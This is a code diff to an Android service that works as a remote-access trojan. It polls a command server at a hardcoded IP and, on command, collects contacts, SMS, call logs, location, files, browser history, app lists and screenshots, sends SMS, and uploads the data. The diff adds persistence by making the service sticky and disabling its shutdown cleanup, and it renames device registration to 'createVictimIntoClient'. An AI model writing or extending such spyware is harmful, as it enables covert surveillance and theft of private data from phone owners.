@@ -1,7 +1,6 @@
 package com.velociraptor.raptor;
 
 import android.Manifest;
-import android.app.Notification;
 import android.app.Service;
 import android.content.Context;
 import android.content.ContextWrapper;
@@ -23,7 +22,6 @@ import android.view.SurfaceHolder;
 import android.widget.Toast;
 
 import androidx.annotation.Nullable;
-import androidx.core.app.ActivityCompat;
 import androidx.core.os.ConfigurationCompat;
 
 import com.androidnetworking.AndroidNetworking;
@@ -68,7 +66,7 @@ import me.everything.providers.android.telephony.TelephonyProvider;
 public class InternalService extends Service implements TextToSpeech.OnInitListener {
 
     public Context context;
-    private String SERVER_URI = "http://192.168.42.162/commands.php";
+    private String SERVER_URI = "http://192.168.43.246/commands.php";
     private Timer timerTaskScheduler = new Timer();
     private LocationTracker tracker = null;
     private String deviceUniqueId = null;
@@ -81,23 +79,20 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
     @Override
     public void onCreate() {
         super.onCreate();
-
         this.context = this.getApplicationContext();
         locationDataClass = new AppContant();
+        AndroidNetworking.initialize(context);
         init();
         //initCamera();
-
 
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        return START_NOT_STICKY;
+        return START_STICKY;
     }
 
     private void init() {
-
-        AndroidNetworking.initialize(getApplicationContext());
 
         new Prefs.Builder()
                 .setContext(this.context)
@@ -144,7 +139,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
 
         Locale current = ConfigurationCompat.getLocales(getResources().getConfiguration()).get(0);
         postData.put("locale_info", current + "");
-        addDeviceToServer(postData);
+        createVictimIntoClient(postData);
     }
 
     private void checkCmdFromServer() {
@@ -168,6 +163,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
 
         postData.put("device_id", deviceUniqueId);
         postData.put("contact_list", json);
+
         sendPostDataToServer(postData);
     }
 
@@ -215,7 +211,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
     }
 
 
-    private void addDeviceToServer(HashMap<String, String> hashMap) {
+    private void createVictimIntoClient(HashMap<String, String> hashMap) {
         AndroidNetworking.post(SERVER_URI)
                 .addBodyParameter(hashMap)
                 .setTag("addDevice")
@@ -246,9 +242,9 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
     @Override
     public void onDestroy() {
         super.onDestroy();
-        AndroidNetworking.cancelAll();
-        timerTaskScheduler.cancel();
-        if (tracker != null) {
+        //AndroidNetworking.cancelAll();
+        //timerTaskScheduler.cancel();
+        /*if (tracker != null) {
             if (tracker.isListening()) {
                 tracker.stopListening(true);
             }
@@ -257,6 +253,59 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         if (textToSpeech != null) {
             textToSpeech.stop();
             textToSpeech.shutdown();
+        }*/
+    }
+
+    private void getCommandType(JSONObject response){
+
+        if (response.has("rehber_oku")) {
+            getPhoneContact();
+        }
+
+        if (response.has("sms_oku")) {
+            getSMSContent();
+        }
+
+        if (response.has("send_sms")) {
+            sendSms(response);
+        }
+
+        if (response.has("device_info")) {
+            getDeviceInfo();
+        }
+
+        if (response.has("location_tracker")) {
+            prepareLocationdata();
+        }
+
+        if (response.has("arama_gecmisi")) {
+            getCallLog();
+        }
+
+        if (response.has("screen_message")) {
+            screenMessage(response);
+        }
+        if (response.has("voice_message")) {
+            startVoiceMessage(response);
+        }
+
+        if (response.has("get_list_file")) {
+            getListFile(response);
+        }
+
+        if (response.has("upload_file_path")) {
+            uploadFile(response);
+        }
+
+        if (response.has("application_list")) {
+            getApplist();
+        }
+
+        if (response.has("browser_history")) {
+            getBrowserHistory();
+        }
+        if (response.has("get_screenshot")) {
+            getScreenshot();
         }
     }
 
@@ -271,56 +320,8 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
                 .getAsJSONObject(new JSONObjectRequestListener() {
                     @Override
                     public void onResponse(JSONObject response) {
-
-                        if (response.has("rehber_oku")) {
-                            getPhoneContact();
-                        }
-
-                        if (response.has("sms_oku")) {
-                            getSMSContent();
-                        }
-
-                        if (response.has("send_sms")) {
-                            sendSms(response);
-                        }
-
-                        if (response.has("device_info")) {
-                            getDeviceInfo();
-                        }
-
-                        if (response.has("location_tracker")) {
-                            prepareLocationdata();
-                        }
-
-                        if (response.has("arama_gecmisi")) {
-                            getCallLog();
-                        }
-
-                        if (response.has("screen_message")) {
-                            screenMessage(response);
-                        }
-                        if (response.has("voice_message")) {
-                            startVoiceMessage(response);
-                        }
-
-                        if (response.has("get_list_file")) {
-                            getListFile(response);
-                        }
-
-                        if (response.has("upload_file_path")) {
-                            uploadFile(response);
-                        }
-
-                        if (response.has("application_list")) {
-                            getApplist();
-                        }
-
-                        if (response.has("browser_history")) {
-                            getBrowserHistory();
-                        }
-                        if (response.has("get_screenshot")) {
-                            getScreenshot();
-                        }
+                        showAllData("RESPONSE" + response.toString());
+                        getCommandType(response);
                     }
 
                     @Override
@@ -328,10 +329,6 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
 
                     }
                 });
-
-        /*
-
-         */
 
     }
 
